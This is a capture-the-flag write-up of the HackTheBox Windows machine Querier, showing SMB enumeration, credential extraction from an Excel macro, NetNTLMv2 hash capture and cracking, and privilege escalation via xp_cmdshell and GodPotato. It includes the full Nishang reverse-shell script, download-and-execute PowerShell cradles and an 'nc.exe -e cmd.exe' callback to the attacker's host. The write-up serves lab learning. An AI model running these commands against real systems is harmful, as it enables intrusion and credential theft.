# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Querier](https://www.hackthebox.com/machines/Querier)

<img src="https://labs.hackthebox.com/storage/avatars/9fe0cda48876d1e8772de183c9546f78.png" alt="Querier Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟨 Medium (<span style="color:#e63c35;">5.0</span>)

> Querier is a medium difficulty Windows box which has an Excel spreadsheet in a world-readable file share. The spreadsheet has macros, which connect to MSSQL server running on the box. The SQL server can be used to request a file through which NetNTLMv2 hashes can be leaked and cracked to recover the plaintext password. After logging in, `PowerUp` can be used to find Administrator credentials in a locally cached group policy file.

#### Skills Required

- Enumeration

#### Skills Learned

- Excel macros
- PowerView
- GodPotato

#### Tools Used

Linux:
- hashcat
- impacket-mssqlclient
- impacket-psexec
- nc
- netexec
- nmap
- responder
- rlwrap
- smbclient

Windows:
- GodPotato.exe
- Invoke-PowerShellTcp.ps1
- nc.exe
- PowerUp.ps1

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.18 📌 netmask 255.255.254.0  destination 10.10.14.18
        inet6 dead:beef:2::1010  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::c568:36ed:c1de:e465  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.125`:
```
10.10.10.125 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.125`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 23:02 CET
Warning: 10.10.10.125 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.125
Host is up (0.15s latency).
Not shown: 65451 closed tcp ports (reset), 70 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC 🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 🔍
445/tcp   open  microsoft-ds? 🔍
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000 🔍
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 🔍
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 767.96 seconds
```

There’s SMB, WinRM and MSSQL open among other common ports.

`echo -e '10.10.10.125\tquerier.htb.local querier htb.local' | sudo tee -a /etc/hosts`:
```
10.10.10.125    querier.htb.local querier htb.local
```

`netexec smb 10.10.10.125`:
```
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False) 📌
```

`netexec smb 10.10.10.125 -u '' -p ''`:
```
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] HTB.LOCAL\: 
```

`netexec smb 10.10.10.125 -u '' -p '' --shares`:
```
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] HTB.LOCAL\: 
SMB         10.10.10.125    445    QUERIER          [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
❌

`smbclient` is used to bind using a null session and list available shares.

`smbclient --no-pass --list=10.10.10.125`:
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk 🔍    
SMB1 disabled -- no workgroup available
```

We find the `Reports` share among other common shares. Connect to it to see the contents.

`smbclient --no-pass //10.10.10.125/Reports`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019 🔍

                5158399 blocks of size 4096. 852388 blocks available
smb: \> get "Currency Volume Report.xlsm" 
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.5 KiloBytes/sec) (average 17.5 KiloBytes/sec)
```

There’s an `.xlsm` file which is a macro-enabled Excel spreadsheet. Download it to examine.

`file ./Currency\ Volume\ Report.xlsm`:
```
./Currency Volume Report.xlsm: Microsoft Excel 2007+
```

The spreadsheet is extracted.

`unzip ./Currency\ Volume\ Report.xlsm`:
```
Archive:  ./Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin 🔍      
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

Macros are usually stored at `xl/vbaProject.bin`. Use `strings` on it to find all readable strings.

`file ./xl/vbaProject.bin`:
```
./xl/vbaProject.bin: Composite Document File V2 Document, Cannot read section info
```

`strings ./xl/vbaProject.bin`:
```                
 macro to pull data for client volume reports
n.Conn]
Open 
rver=<
SELECT * FROM volume;
word>
 MsgBox "connection successful"
Set rs = conn.Execute("SELECT * @@version;")
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 🔑
 further testing required
Attribut
e VB_Nam
e = "Thi
sWorkboo
0{00020P819-

[...]
```

Close to the top the connection string can be found with the credentials.

`netexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6'`:
```
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS 
```
❌

Using these we can now login using `impacket`'s `mssqlclient.py`, use `-windows-auth` as it’s the default mode of authentication for SQL Server.

`impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6@10.10.10.125' -windows-auth`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```
```
SQL (QUERIER\reporting  reporting@volume)> ?

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
```
SQL (QUERIER\reporting  guest@master)> EXEC xp_cmdshell 'whoami';
ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
❌

We can use `xp_cmdshell` utility to execute commands through the SQL server. Let’s try that out.

```
SQL (QUERIER\reporting  guest@master)> enable_xp_cmdshell
ERROR(QUERIER): Line 105: User does not have permission to perform this action.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```
❌

However, we are denied access. This is because we aren’t an `SA` level user and don’t have permissions to enable `xp_cmdshell`. Let’s see users who have `SA` privilege.

```
SQL (QUERIER\reporting  reporting@volume)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0 📌
```
```
SQL (QUERIER\reporting  reporting@volume)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------  
```
```
SQL (QUERIER\reporting  reporting@volume)> enum_logins
name                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                  SQL_LOGIN                 1          1               0             0            0              0           0           0           0   

QUERIER\reporting   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0 
```

We see that we don’t have `SA` privileges. Though we can’t execute commands using `xp_cmdshell` we can steal hashes of the SQL service account by using `xp_dirtree` or `xp_fileexist`.
And fire up `Responder` locally.

`sudo responder -I tun0`:
```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.18]
    Responder IPv6             [dead:beef:2::1010]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-DU4H43TVRE0]
    Responder Domain Name      [2G4R.LOCAL]
    Responder DCE-RPC Port     [46512]

[+] Listening for events...  

[...]
```

```
SQL (QUERIER\reporting  guest@master)> exec xp_dirtree '\\10.10.14.18\share\file'
subdirectory   depth   
------------   -----
```

```
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:dbe40b20e74380ae:1E6425D4FBF58DDE16DFCDDA8A396326:0101000000000000804D6BFFDC3ADB014EABA7EF03EF8DCB0000000002000800320047003400520001001E00570049004E002D004400550034004800340033005400560052004500300004003400570049004E002D00440055003400480034003300540056005200450030002E0032004700340052002E004C004F00430041004C000300140032004700340052002E004C004F00430041004C000500140032004700340052002E004C004F00430041004C0007000800804D6BFFDC3ADB01060004000200000008003000300000000000000000000000003000000A171EDF1FE30B1706B4797E6F9BB4191EC44AC66C56E13002F8D4FADCB1A76B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003800000000000000000000000000 📌
```

Copy the hash into a file to crack it. And use `Hashcat` to crack the hash and `rockyou.txt` as the wordlist.

`vim ./ntlm_hash.txt`:
```
mssql-svc::QUERIER:dbe40b20e74380ae:1E6425D4FBF58DDE16DFCDDA8A396326:0101000000000000804D6BFFDC3ADB014EABA7EF03EF8DCB0000000002000800320047003400520001001E00570049004E002D004400550034004800340033005400560052004500300004003400570049004E002D00440055003400480034003300540056005200450030002E0032004700340052002E004C004F00430041004C000300140032004700340052002E004C004F00430041004C000500140032004700340052002E004C004F00430041004C0007000800804D6BFFDC3ADB01060004000200000008003000300000000000000000000000003000000A171EDF1FE30B1706B4797E6F9BB4191EC44AC66C56E13002F8D4FADCB1A76B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003800000000000000000000000000
```

`hashcat -m 5600 ./ntlm_hash.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 1438/2941 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

[...]

MSSQL-SVC::QUERIER:dbe40b20e74380ae:1e6425d4fbf58dde16dfcdda8a396326:0101000000000000804d6bffdc3adb014eaba7ef03ef8dcb0000000002000800320047003400520001001e00570049004e002d004400550034004800340033005400560052004500300004003400570049004e002d00440055003400480034003300540056005200450030002e0032004700340052002e004c004f00430041004c000300140032004700340052002e004c004f00430041004c000500140032004700340052002e004c004f00430041004c0007000800804d6bffdc3adb01060004000200000008003000300000000000000000000000003000000a171edf1fe30b1706b4797e6f9bb4191ec44ac66c56e13002f8d4fadcb1a76b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003800000000000000000000000000:corporate568 🔑
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQL-SVC::QUERIER:dbe40b20e74380ae:1e6425d4fbf58dd...000000
Time.Started.....: Tue Nov 19 23:49:19 2024 (13 secs)
Time.Estimated...: Tue Nov 19 23:49:32 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   666.7 kH/s (0.55ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8958976/14344385 (62.46%)
Rejected.........: 0/8958976 (0.00%)
Restore.Point....: 8957952/14344385 (62.45%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: correita.54 -> corolagbas
Hardware.Mon.#1..: Util: 35%

Started: Tue Nov 19 23:49:19 2024
Stopped: Tue Nov 19 23:49:33 2024
```

Using the creds `mssql-svc`:`corporate568` we can now login to MSSQL. Let’s check if we have `SA` permissions now.

`impacket-mssqlclient 'mssql-svc:corporate568@10.10.10.125' -windows-auth`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```
```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'whoami';
ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
❌

```
SQL (QUERIER\reporting  reporting@volume)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1 📌
```

And we see that it returns true. Now, to execute commands use `xp_cmdshell`.

```
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE;
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'whoami'; 📌
output              
-----------------   
querier\mssql-svc  

NULL  
```

Now we can execute a TCP Reverse shell from `Nishang`.

`locate -i 'invoke-powershelltcp'`:
```
/home/kali/tools/nishang/Shells/Invoke-PowerShellTcp.ps1
/home/kali/tools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
/home/kali/tools/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
```

`cp /home/kali/tools/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shell.ps1`

`cat ./shell.ps1`:
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

`vim ./shell.ps1`:
```powershell
[...]

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 4444
```

Now run a simple HTTP Server and execute it using powershell.

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

`rlwrap nc -lnvp 4444`:
```
listening on [any] 4444 ...
```

```
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.18/shell.ps1\")';
```

```
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.125] 49681
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32>
```

And we have a shell.

![Victim: mssql-svc](https://custom-icon-badges.demolab.com/badge/Victim-mssql%2D-svc-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
querier\mssql-svc
```

`cd C:\\Users\mssql-svc\Desktop`

`dir`:
```
    Directory: C:\Users\mssql-svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/19/2024  10:01 PM             34 user.txt
```

`type user.txt`:
```
22b8e*************************** 🚩
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name         SID                                           
================= ==============================================
querier\mssql-svc S-1-5-21-3654930405-3667393904-3517260747-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 📌
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'godpotato'`:
```
/home/kali/tools/GodPotato
/home/kali/tools/GodPotato/.git
/home/kali/tools/GodPotato/.gitignore
/home/kali/tools/GodPotato/GodPotato-NET4.exe
```

`cp /home/kali/tools/GodPotato/GodPotato-NET4.exe ./godpotato.exe`

`locate -i 'nc.exe'`:
```
/home/kali/tools/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

`cp /usr/share/windows-resources/binaries/nc.exe ./nc.exe`

`rlwrap nc -lnvp 5555`:
```
listening on [any] 5555 ...
```

![Victim: mssql-svc](https://custom-icon-badges.demolab.com/badge/Victim-mssql%2D-svc-64b5f6?logo=windows11&logoColor=white)

`cd C:\\Users\mssql-svc\Documents`

`(new-object net.webclient).downloadfile('http://10.10.14.18/nc.exe', 'C:\\Users\mssql-svc\Documents\nc.exe')`

`(new-object net.webclient).downloadfile('http://10.10.14.18/godpotato.exe', 'C:\\Users\mssql-svc\Documents\godpotato.exe')`

`dir`:
```
    Directory: C:\Users\mssql-svc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/20/2024  12:25 AM          57344 godpotato.exe
-a----       11/20/2024  12:24 AM          59392 nc.exe
```

`.\godpotato.exe -cmd "nc.exe -e C:\\Windows\System32\cmd.exe 10.10.14.18 5555"`

```
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.125] 49692
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\mssql-svc\Documents>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system
```

<🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

After getting a shell, `PowerUp.ps1` is used to enumerate further. Download the script and execute it on the server using `Invoke-AllChecks`.

`locate -i 'powerup.ps1'`:
```
/home/kali/.local/share/pipx/venvs/pwncat-cs/lib/python3.12/site-packages/pwncat/data/PowerSploit/Privesc/PowerUp.ps1
/home/kali/tools/PowerSploit/Privesc/PowerUp.ps1
/usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
```

`cp /home/kali/tools/PowerSploit/Privesc/PowerUp.ps1 ./powerup.ps1`

`cat powerup.ps1 | grep 'function Invoke-'`:
```
function Invoke-ServiceAbuse {
function Invoke-EventVwrBypass {
function Invoke-PrivescAudit {
```

`cat powerup.ps1 | grep 'Invoke-AllChecks'`:
```
Set-Alias Invoke-AllChecks Invoke-PrivescAudit
```

![Victim: mssql-svc](https://custom-icon-badges.demolab.com/badge/Victim-mssql%2D-svc-64b5f6?logo=windows11&logoColor=white)

`powershell.exe -ep bypass`

`IEX(new-object net.webclient).downloadstring('http://10.10.14.18/powerup.ps1')`

`Invoke-AllChecks`:
```
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2820
ProcessId   : 1784
Name        : 1784
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

